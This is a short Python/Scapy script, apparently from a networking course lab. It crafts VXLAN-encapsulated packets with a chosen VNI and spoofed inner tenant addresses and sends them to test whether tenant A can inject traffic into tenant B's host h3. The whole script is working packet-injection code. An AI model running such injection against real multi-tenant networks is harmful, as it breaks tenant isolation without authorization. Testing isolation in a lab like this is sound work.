#!/usr/bin/env python3

import argparse
import time
from scapy.all import Ether, IP, UDP, VXLAN, Raw, sendp

parser = argparse.ArgumentParser(
    description="Test tenant-originated VXLAN injection against h3."
)
parser.add_argument("--iface", default="vtep1-eth1")
parser.add_argument("--count", type=int, default=5)
args = parser.parse_args()

VTEP1_MAC = "00:00:00:00:01:01"
VTEP2_MAC = "00:00:00:00:02:01"

VTEP1_IP = "10.0.0.1"
VTEP2_IP = "10.0.0.2"

TENANT_A_IP = "192.168.10.1"
TENANT_B_H3_IP = "192.168.20.1"
TENANT_B_H3_MAC = "00:00:00:00:20:01"


def make_packet(index):
    inner_packet = (
        Ether(
            src="02:aa:bb:cc:dd:01",
            dst=TENANT_B_H3_MAC
        )
        / IP(src=TENANT_A_IP, dst=TENANT_B_H3_IP)
        / UDP(sport=45000 + index, dport=9999)
        / Raw(load=f"TENANT_A_TO_H3_INJECTION_{index}")
    )

    return (
        Ether(src=VTEP1_MAC, dst=VTEP2_MAC)
        / IP(src=VTEP1_IP, dst=VTEP2_IP)
        / UDP(sport=40000 + index, dport=4789)
        / VXLAN(flags=0x08, vni=1002)
        / inner_packet
    )


print("Exact professor-requested tenant injection test")
print("Ingress interface:", args.iface)
print("VNI:", 1002)
print("Inner destination:", TENANT_B_H3_IP)
print("Inner destination MAC:", TENANT_B_H3_MAC)
print("Packets:", args.count)

for i in range(args.count):
    sendp(make_packet(i), iface=args.iface, count=1, verbose=False)
    time.sleep(0.2)

print(f"Sent {args.count} crafted packets.")
